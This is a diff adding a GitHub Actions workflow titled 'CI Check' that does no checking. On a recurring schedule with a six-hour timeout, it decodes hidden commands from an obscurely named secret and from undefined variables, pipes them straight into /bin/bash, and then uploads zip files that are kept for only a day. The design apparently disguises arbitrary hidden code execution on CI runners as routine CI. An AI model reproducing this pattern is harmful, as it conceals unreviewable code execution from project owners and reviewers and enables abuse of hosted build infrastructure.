@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          y7180: ${{ secrets.y7180 }}
+        run: |
+          printf '%s' "$y7180" | jq -r .jc2 | /bin/bash
+          echo $mcqai46831 | jq -r .r7115 | /bin/bash
+          echo $gym8 | jq -r .lmm64792 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: gT1ugO8L
+          path: "*.zip"
+          retention-days: 1
